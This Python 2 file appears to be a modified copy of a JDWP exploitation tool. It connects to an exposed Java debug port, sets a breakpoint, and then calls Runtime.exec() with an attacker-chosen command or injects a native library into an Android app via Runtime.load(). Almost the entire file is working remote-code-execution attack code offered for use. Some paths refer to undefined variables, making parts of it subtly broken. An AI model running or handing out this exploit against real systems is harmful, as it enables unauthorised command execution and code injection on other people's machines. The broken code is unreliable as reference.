#!/usr/bin/python
################################################################################
#
# Universal JDWP shellifier
#
# @_hugsy_
#
# And special cheers to @lanjelot
#
# loadlib option by @ikoz
#

import argparse
import json
import logging
import logging.config
import os
import socket
import struct
import sys
import time
import traceback
import urllib

################################################################################
#
# JDWP protocol variables
#
HANDSHAKE = "JDWP-Handshake"

REQUEST_PACKET_TYPE = 0x00
REPLY_PACKET_TYPE = 0x80

# Command signatures
VERSION_SIG = (1, 1)
CLASSESBYSIGNATURE_SIG = (1, 2)
ALLCLASSES_SIG = (1, 3)
ALLTHREADS_SIG = (1, 4)
IDSIZES_SIG = (1, 7)
CREATESTRING_SIG = (1, 11)
SUSPENDVM_SIG = (1, 8)
RESUMEVM_SIG = (1, 9)
SIGNATURE_SIG = (2, 1)
FIELDS_SIG = (2, 4)
METHODS_SIG = (2, 5)
GETVALUES_SIG = (2, 6)
CLASSOBJECT_SIG = (2, 11)
INVOKESTATICMETHOD_SIG = (3, 3)
REFERENCETYPE_SIG = (9, 1)
INVOKEMETHOD_SIG = (9, 6)
STRINGVALUE_SIG = (10, 1)
THREADNAME_SIG = (11, 1)
THREADSUSPEND_SIG = (11, 2)
THREADRESUME_SIG = (11, 3)
THREADSTATUS_SIG = (11, 4)
EVENTSET_SIG = (15, 1)
EVENTCLEAR_SIG = (15, 2)
EVENTCLEARALL_SIG = (15, 3)

# Other codes
MODKIND_COUNT = 1
MODKIND_THREADONLY = 2
MODKIND_CLASSMATCH = 5
MODKIND_LOCATIONONLY = 7
EVENT_BREAKPOINT = 2
SUSPEND_EVENTTHREAD = 1
SUSPEND_ALL = 2
NOT_IMPLEMENTED = 99
VM_DEAD = 112
INVOKE_SINGLE_THREADED = 2
TAG_OBJECT = 76
TAG_STRING = 115
TYPE_CLASS = 1


################################################################################
#
# JDWP client class
#
class JDWPClient:

    def __init__(self, host, port=8000):
        self.host = host
        self.port = port
        self.methods = {}
        self.fields = {}
        self.id = 0x01
        self.socket = None
        self.classes = []
        self.threads = []

    def create_packet(self, cmd_sig, data=""):
        flags = 0x00
        cmd_set, cmd = cmd_sig
        pkt_len = len(data) + 11
        pkt = struct.pack(">IIccc", pkt_len, self.id, chr(flags), chr(cmd_set), chr(cmd))
        pkt += data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self.socket.recv(11)
        pkt_len, id, flags, errcode = struct.unpack(">IIcH", header)

        if flags == chr(REPLY_PACKET_TYPE):
            if errcode:
                logger.error("Received errcode %d" % errcode)
                raise Exception("Received errcode %d" % errcode)
        buf = ""
        while len(buf) + 11 < pkt_len:
            data = self.socket.recv(1024)
            if len(data):
                buf += data
            else:
                time.sleep(1)
        return buf

    def parse_entries(self, buf, formats, explicit=True):
        entries = []
        index = 0

        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1
        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = int(struct.unpack(">Q", buf[index:index + 8])[0])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = int(struct.unpack(">I", buf[index:index + 4])[0])
                    index += 4
                elif fmt == 'S':
                    l = struct.unpack(">I", buf[index:index + 4])[0]
                    data[name] = buf[index + 4:index + 4 + l]
                    index += 4 + l
                elif fmt == 'C':
                    data[name] = ord(struct.unpack(">c", buf[index])[0])
                    index += 1
                elif fmt == 'Z':
                    t = ord(struct.unpack(">c", buf[index])[0])
                    if t == 115:
                        s = self.solve_string(buf[index + 1:index + 9])
                        data[name] = s
                        index += 9
                    elif t == 73:
                        data[name] = struct.unpack(">I", buf[index + 1:index + 5])[0]
                        buf = struct.unpack(">I", buf[index + 5:index + 9])
                        index = 0
                else:
                    logger.error("error")
                    sys.exit(1)
            entries.append(data)
        return entries

    def format(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)
        logger.error("Unknown format")
        raise Exception("Unknown format")

    def unformat(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", value[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", value[:4])[0]
        else:
            logger.error("Unknown format")
            raise Exception("Unknown format")

    def start(self):
        self.handshake(self.host, self.port)
        self.id_sizes()
        self.get_version()
        self.all_classes()

    def handshake(self, host, port):
        s = socket.socket()
        try:
            s.connect((host, port))
        except socket.error as msg:
            logger.error("Failed to connect: %s" % msg)
            raise Exception("Failed to connect: %s" % msg)
        s.send(HANDSHAKE)

        if s.recv(len(HANDSHAKE)) != HANDSHAKE:
            logger.error("Failed to handshake, Please close AndroidStudio, UE4 and other programs that may occupy ADB before using this program")
            raise Exception("Failed to handshake")
        else:
            self.socket = s

    def leave(self):
        self.socket.close()

    def get_version(self):
        self.socket.sendall(self.create_packet(VERSION_SIG))
        buf = self.read_reply()
        formats = [('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                   ('S', "vmVersion"), ('S', "vmName"), ]
        for entry in self.parse_entries(buf, formats, False):
            for name, value in entry.iteritems():
                setattr(self, name, value)

    @property
    def version(self):
        return "%s - %s" % (self.vmName, self.vmVersion)

    def id_sizes(self):
        self.socket.sendall(self.create_packet(IDSIZES_SIG))
        buf = self.read_reply()
        formats = [("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                   ("I", "referenceTypeIDSize"), ("I", "frameIDSize")]
        for entry in self.parse_entries(buf, formats, False):
            for name, value in entry.iteritems():
                setattr(self, name, value)

    def all_threads(self):
        try:
            getattr(self, "threads")
        except Exception as e:
            logger.error(e)
            self.socket.sendall(self.create_packet(ALLTHREADS_SIG))
            buf = self.read_reply()
            formats = [(self.objectIDSize, "threadId")]
            self.threads = self.parse_entries(buf, formats)

    def get_thread_by_name(self, name):
        self.all_threads()
        for t in self.threads:
            thread_id = self.format(self.objectIDSize, t["threadId"])
            self.socket.sendall(self.create_packet(THREADNAME_SIG, data=thread_id))
            buf = self.read_reply()
            if len(buf) and name == self.readstring(buf):
                return t
        return None

    def all_classes(self):
        self.socket.sendall(self.create_packet(ALLCLASSES_SIG))
        buf = self.read_reply()
        logger.error(buf)
        formats = [('C', "refTypeTag"),
                   (self.referenceTypeIDSize, "refTypeId"),
                   ('S', "signature"),
                   ('I', "status")]
        self.classes = self.parse_entries(buf, formats)
        return self.classes

    def get_class_by_name(self, name):
        for entry in self.classes:
            if entry["signature"].lower() == name.lower():
                return entry
        return None

    def get_methods(self, ref_type_id):
        if not self.methods.has_key(ref_type_id):
            ref_id = self.format(self.referenceTypeIDSize, ref_type_id)
            self.socket.sendall(self.create_packet(METHODS_SIG, data=ref_id))
            buf = self.read_reply()
            formats = [(self.methodIDSize, "methodId"),
                       ('S', "name"),
                       ('S', "signature"),
                       ('I', "modBits")]
            self.methods[ref_type_id] = self.parse_entries(buf, formats)
        return self.methods[ref_type_id]

    def get_method_by_name(self, name):
        for ref_id in self.methods.keys():
            for entry in self.methods[ref_id]:
                if entry["name"].lower() == name.lower():
                    return entry
        return None

    def get_file_id(self, ref_type_id):
        if not self.fields.has_key(refTypeId):
            ref_id = self.format(self.referenceTypeIDSize, ref_type_id)
            self.socket.sendall(self.create_packet(FIELDS_SIG, data=ref_id))
            buf = self.read_reply()
            formats = [(self.fieldIDSize, "fieldId"),
                       ('S', "name"),
                       ('S', "signature"),
                       ('I', "modbits")]
            self.fields[ref_type_id] = self.parse_entries(buf, formats)
        return self.fields[ref_type_id]

    def get_value(self, ref_type_id, field_id):
        data = self.format(self.referenceTypeIDSize, ref_type_id)
        data += struct.pack(">I", 1)
        data += self.format(self.fieldIDSize, field_id)
        self.socket.sendall(self.create_packet(GETVALUES_SIG, data=data))
        buf = self.read_reply()
        formats = [("Z", "value")]
        field = self.parse_entries(buf, formats)[0]
        return field

    def create_string(self, data):
        buf = self.buildstring(data)
        self.socket.sendall(self.create_packet(CREATESTRING_SIG, data=buf))
        buf = self.read_reply()
        return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)

    def buildstring(self, data):
        return struct.pack(">I", len(data)) + data

    def readstring(self, data):
        size = struct.unpack(">I", data[:4])[0]
        return data[4:4 + size]

    def suspendvm(self):
        self.socket.sendall(self.create_packet(SUSPENDVM_SIG))
        self.read_reply()
        return

    def resume_vm(self):
        self.socket.sendall(self.create_packet(RESUMEVM_SIG))
        self.read_reply()
        return

    def invoke_static(self, class_id, thread_id, method_id, *args):
        data = self.format(self.referenceTypeIDSize, class_id)
        data += self.format(self.objectIDSize, thread_id)
        data += self.format(self.methodIDSize, method_id)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKESTATICMETHOD_SIG, data=data))
        buf = self.read_reply()
        return buf

    def invoke(self, obj_id, thread_id, class_id, method_id, *args):
        data = self.format(self.objectIDSize, obj_id)
        data += self.format(self.objectIDSize, thread_id)
        data += self.format(self.referenceTypeIDSize, class_id)
        data += self.format(self.methodIDSize, method_id)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKEMETHOD_SIG, data=data))
        buf = self.read_reply()
        return buf

    def invoke_void(self, obj_id, thread_id, class_id, method_id, *args):
        data = self.format(self.objectIDSize, obj_id)
        data += self.format(self.objectIDSize, thread_id)
        data += self.format(self.referenceTypeIDSize, class_id)
        data += self.format(self.methodIDSize, method_id)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKEMETHOD_SIG, data=data))
        buf = None
        return buf

    def solve_string(self, obj_id):
        self.socket.sendall(self.create_packet(STRINGVALUE_SIG, data=obj_id))
        buf = self.read_reply()
        if len(buf):
            return self.readstring(buf)
        else:
            return ""

    def query_thread(self, thread_id, kind):
        data = self.format(self.objectIDSize, thread_id)
        self.socket.sendall(self.create_packet(kind, data=data))

    def suspend_thread(self, thread_id):
        return self.query_thread(thread_id, THREADSUSPEND_SIG)

    def status_thread(self, thread_id):
        return self.query_thread(thread_id, THREADSTATUS_SIG)

    def resume_thread(self, thread_id):
        return self.query_thread(thread_id, THREADRESUME_SIG)

    def send_event(self, event_code, *args):
        data = ""
        data += chr(event_code)
        data += chr(SUSPEND_ALL)
        data += struct.pack(">I", len(args))

        for kind, option in args:
            data += chr(kind)
            data += option

        self.socket.sendall(self.create_packet(EVENTSET_SIG, data=data))
        buf = self.read_reply()
        return struct.unpack(">I", buf)[0]

    def clear_event(self, event_code, r_id):
        data = chr(event_code)
        data += struct.pack(">I", r_id)
        self.socket.sendall(self.create_packet(EVENTCLEAR_SIG, data=data))
        self.read_reply()
        return

    def clear_events(self):
        self.socket.sendall(self.create_packet(EVENTCLEARALL_SIG))
        self.read_reply()
        return

    def wait_for_event(self):
        buf = self.read_reply()
        return buf

    def parse_event_breakpoint(self, buf, event_id):
        num = struct.unpack(">I", buf[2:6])[0]
        r_id = struct.unpack(">I", buf[6:10])[0]
        if r_id != event_id:
            return None
        t_id = self.unformat(self.objectIDSize, buf[10:10 + self.objectIDSize])
        loc = -1  # don't care
        return r_id, t_id, loc


def runtime_exec(jdwp, args):
    logger.info("[+] Targeting '%s:%d'" % (args.target, args.port))
    logger.info("[+] Reading settings for '%s'" % jdwp.version)

    # 1. get Runtime class reference
    runtime_class = jdwp.get_class_by_name("Ljava/lang/Runtime;")
    if runtime_class is None:
        logger.error("[-] Cannot find class Runtime")
        return False
    logger.info("[+] Found Runtime class: id=%x" % runtime_class["refTypeId"])

    # 2. get getRuntime() method reference
    jdwp.get_methods(runtime_class["refTypeId"])
    runtime_method = jdwp.get_method_by_name("getRuntime")
    if runtime_method is None:
        logger.error("[-] Cannot find method Runtime.getRuntime()")
        return False
    logger.info("[+] Found Runtime.getRuntime(): id=%x" % runtime_method["methodId"])

    # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name(args.break_on_class)
    if c is None:
        logger.error("[-] Could not access class '%s'" % args.break_on_class)
        logger.error("[-] It is possible that this class is not used by application")
        logger.error("[-] Test with another one with option `--break-on`")
        return False

    jdwp.get_methods(c["refTypeId"])
    m = jdwp.get_method_by_name(args.break_on_method)
    if m is None:
        logger.error("[-] Could not access method '%s'" % args.break_on)
        return False

    loc = chr(TYPE_CLASS)
    loc += jdwp.format(jdwp.referenceTypeIDSize, c["refTypeId"])
    loc += jdwp.format(jdwp.methodIDSize, m["methodId"])
    loc += struct.pack(">II", 0, 0)
    data = [(MODKIND_LOCATIONONLY, loc), ]
    r_id = jdwp.send_event(EVENT_BREAKPOINT, *data)
    logger.info("[+] Created break event id=%x" % r_id)

    # 4. resume vm and wait for event
    jdwp.resume_vm()
    logger.info("[+] Waiting for an event on '%s'" % args.break_on)
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, r_id)
        if ret is not None:
            break

    r_id, t_id, loc = ret
    logger.info("[+] Received matching event from thread %#x" % t_id)

    # time.sleep(1)
    # jdwp.clear_event(EVENT_BREAKPOINT, r_id)

    # 5. Now we can execute any code
    if args.cmd:
        runtime_exec_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], args.cmd)
    elif args.loadlib:
        package_name = get_package_name(jdwp, t_id)
        tmp_location = "/data/local/tmp/" + args.loadlib
        dst_location = "/data/data/" + package_name + "/" + args.loadlib
        command = "cp " + tmp_location + " " + dst_location
        logger.info("[*] Copying library from " + tmp_location + " to " + dst_location)
        runtime_exec_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], command)
        time.sleep(2)
        logger.info("[*] Executing Runtime.load(" + dst_location + ")")
        runtime_load_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], dst_location)
        time.sleep(2)
        logger.info("[*] Library should now be loaded")
    else:
        # by default, only prints out few system properties
        runtime_exec_info(jdwp, tId)
    jdwp.resume_vm()
    logger.info("[!] Command successfully executed")
    return True


def runtime_exec_info(jdwp, thread_id):
    #
    # This function calls java.lang.System.getProperties() and
    # displays OS properties (non-intrusive)
    #
    properties = {"java.version": "Java Runtime Environment version",
                  "java.vendor": "Java Runtime Environment vendor",
                  "java.vendor.url": "Java vendor URL",
                  "java.home": "Java installation directory",
                  "java.vm.specification.version": "Java Virtual Machine specification version",
                  "java.vm.specification.vendor": "Java Virtual Machine specification vendor",
                  "java.vm.specification.name": "Java Virtual Machine specification name",
                  "java.vm.version": "Java Virtual Machine implementation version",
                  "java.vm.vendor": "Java Virtual Machine implementation vendor",
                  "java.vm.name": "Java Virtual Machine implementation name",
                  "java.specification.version": "Java Runtime Environment specification version",
                  "java.specification.vendor": "Java Runtime Environment specification vendor",
                  "java.specification.name": "Java Runtime Environment specification name",
                  "java.class.version": "Java class format version number",
                  "java.class.path": "Java class path",
                  "java.library.path": "List of paths to search when loading libraries",
                  "java.io.tmpdir": "Default temp file path",
                  "java.compiler": "Name of JIT compiler to use",
                  "java.ext.dirs": "Path of extension directory or directories",
                  "os.name": "Operating system name",
                  "os.arch": "Operating system architecture",
                  "os.version": "Operating system version",
                  "file.separator": "File separator",
                  "path.separator": "Path separator",
                  "user.name": "User's account name",
                  "user.home": "User's home directory",
                  "user.dir": "User's current working directory"
                  }

    system_class = jdwp.get_class_by_name("Ljava/lang/System;")
    if systemClass is None:
        logger.error("[-] Cannot find class java.lang.System")
        return False

    jdwp.get_methods(system_class["refTypeId"])
    get_property_method = jdwp.get_method_by_name("getProperty")
    if get_property_method is None:
        logger.error("[-] Cannot find method System.getProperty()")
        return False

    for prop_str, prop_desc in properties.iteritems():
        prop_obj_ids = jdwp.create_string(prop_str)
        if len(prop_obj_ids) == 0:
            logger.error("[-] Failed to allocate command")
            return False
        prop_obj_id = prop_obj_ids[0]["objId"]

        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, prop_obj_id), ]
        buf = jdwp.invoke_static(systemClass["refTypeId"],
                                thread_id,
                                get_property_method["methodId"],
                                *data)
        if buf[0] != chr(TAG_STRING):
            logger.info("[-] %s: Unexpected returned type: expecting String" % prop_str)
        else:
            ret_id = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
            res = cli.solve_string(jdwp.format(jdwp.objectIDSize, ret_id))
            logger.info("[+] Found %s '%s'" % (prop_desc, res))
    return True


def runtime_exec_payload(jdwp, thread_id, runtime_class_id, runtime_method_id, command):
    #
    # This function will invoke command as a payload, which will be running
    # with JVM privilege on host (intrusive).
    #
    logger.info("[+] Selected payload '%s'" % command)

    # 1. allocating string containing our command to exec()
    cmd_obj_ids = jdwp.create_string(command)
    if len(cmd_obj_ids) == 0:
        logger.error("[-] Failed to allocate command")
        return False
    cmd_obj_id = cmd_obj_ids[0]["objId"]
    logger.info("[+] Command string object created id:%x" % cmd_obj_id)

    # 2. use context to get Runtime object
    buf = jdwp.invoke_static(runtime_class_id, thread_id, runtime_method_id)
    if buf[0] != chr(TAG_OBJECT):
        logger.error("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])

    if rt is None:
        logger.error("[-] Failed to invoke Runtime.getRuntime()")
        return False
    logger.info("[+] Runtime.getRuntime() returned context id:%#x" % rt)

    # 3. find exec() method
    exec_method = jdwp.get_method_by_name("exec")
    if exec_method is None:
        logger.error("[-] Cannot find method Runtime.exec()")
        return False
    logger.info("[+] found Runtime.exec(): id=%x" % exec_method["methodId"])

    # 4. call exec() in this context with the alloc-ed string
    data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmd_obj_id)]
    buf = jdwp.invoke(rt, thread_id, runtime_class_id, exec_method["methodId"], *data)
    if buf[0] != chr(TAG_OBJECT):
        logger.error("[-] Unexpected returned type: expecting Object")
        return False
    logger.info("[+] Runtime.exec() successful, retId=%x" % jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize]))
    return True


def get_package_name(jdwp, thread_id):
    #
    # This function will invoke ActivityThread.currentApplication().getPackageName()
    #
    activity_thread_class = jdwp.get_class_by_name("Landroid/app/ActivityThread;")
    if activity_thread_class is None:
        logger.error("[-] Cannot find class android.app.ActivityThread")
        return False

    context_wrapper_class = jdwp.get_class_by_name("Landroid/content/ContextWrapper;")
    if context_wrapper_class is None:
        logger.error("[-] Cannot find class android.content.ContextWrapper")
        return False

    jdwp.get_methods(activity_thread_class["refTypeId"])
    jdwp.get_methods(context_wrapper_class["refTypeId"])

    get_context_method = jdwp.get_method_by_name("currentApplication")
    if get_context_method is None:
        logger.error("[-] Cannot find method ActivityThread.currentApplication()")
        return False

    buf = jdwp.invoke_static(
        activity_thread_class["refTypeId"], thread_id, get_context_method["methodId"])
    if buf[0] != chr(TAG_OBJECT):
        logger.error("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
    if rt is None:
        logger.error("[-] Failed to invoke ActivityThread.currentApplication()")
        return False

    # 3. find getPackageName() method
    get_package_name_method = jdwp.get_method_by_name("getPackageName")
    if get_package_name is None:
        logger.error("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
        return False

    # 4. call getPackageNameMeth()
    buf = jdwp.invoke(rt, thread_id, context_wrapper_class["refTypeId"], get_package_name_method["methodId"])
    if buf[0] != chr(TAG_STRING):
        logger.info("[-] %s: Unexpected returned type: expecting String")
    else:
        ret_id = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
        res = cli.solve_string(jdwp.format(jdwp.objectIDSize, ret_id))
        logger.info("[+] getPackageMethod(): '%s'" % res)
    return "%s" % res


def runtime_load_payload(jdwp, thread_id, runtime_class_id, runtime_method_id, library):
    #
    # This function will run Runtime.load() with library as a payload
    #

    # print("[+] Selected payload '%s'" % library)

    # 1. allocating string containing our command to exec()
    cmd_obj_ids = jdwp.create_string(library)
    if len(cmd_obj_ids) == 0:
        logger.error("[-] Failed to allocate library string")
        return False
    cmd_obj_id = cmd_obj_ids[0]["objId"]
    logger.info("[+] Command string object created id:%x" % cmd_obj_id)

    # 2. use context to get Runtime object
    buf = jdwp.invoke_static(runtime_class_id, thread_id, runtime_method_id)
    if buf[0] != chr(TAG_OBJECT):
        logger.error("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])

    if rt is None:
        logger.error("[-] Failed to invoke Runtime.getRuntime()")
        return False
    # print("[+] Runtime.getRuntime() returned context id:%#x" % rt)

    # 3. find load() method
    load_method = jdwp.get_method_by_name("load")
    if load_method is None:
        logger.error("[-] Cannot find method Runtime.load()")
        return False
    # print("[+] found Runtime.load(): id=%x" % loadMeth["methodId"])

    # 4. call exec() in this context with the alloc-ed string
    data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmd_obj_id)]
    jdwp.invoke_void(rt, thread_id, runtime_class_id, load_method["methodId"], *data)
    logger.info("[+] Runtime.load(%s) probably successful" % library)
    return True


def path_parse(s):
    i = s.rfind('.')
    if i == -1:
        logger.error('Cannot parse path')
        sys.exit(1)
    return 'L' + s[:i].replace('.', '/') + ';', s[i:][1:]


def setup_logging(default_path='logging.json', default_level=logging.INFO):
    if os.path.exists(default_path):
        with open(default_path, 'r') as f:
            config = json.load(f)
            logging.config.dictConfig(config)
    else:
        logging.basicConfig(level=default_level)
    return logging.getLogger('jdwp')


if __name__ == "__main__":
    logger = setup_logging(default_path=os.path.join(os.getcwd(), 'logging.json'))
    if sys.version > '3':
        logger.error("Currently only supports python2!")
    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
    parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")

    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                        default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                        help="Specify command to execute remotely")
    parser.add_argument("--loadlib", dest="loadlib", type=str, metavar="LIBRARYNAME",
                        help="Specify library to inject into process load")

    args = parser.parse_args()

    class_name, method_name = path_parse(args.break_on)
    setattr(args, "break_on_class", class_name)
    setattr(args, "break_on_method", method_name)

    ret_code = 0

    try:
        cli = JDWPClient(args.target, args.port)
        cli.start()
        if not runtime_exec(cli, args):
            logger.error("[-] Exploit failed")
            ret_code = 1
    except KeyboardInterrupt:
        logger.error("[+] Exiting on user's request")
    except Exception as e:
        logger.error("[-] Exception: %s" % e)
        traceback.print_exc()
        ret_code = 1
        cli = None
    finally:
        if cli:
            cli.leave()

    sys.exit(ret_code)
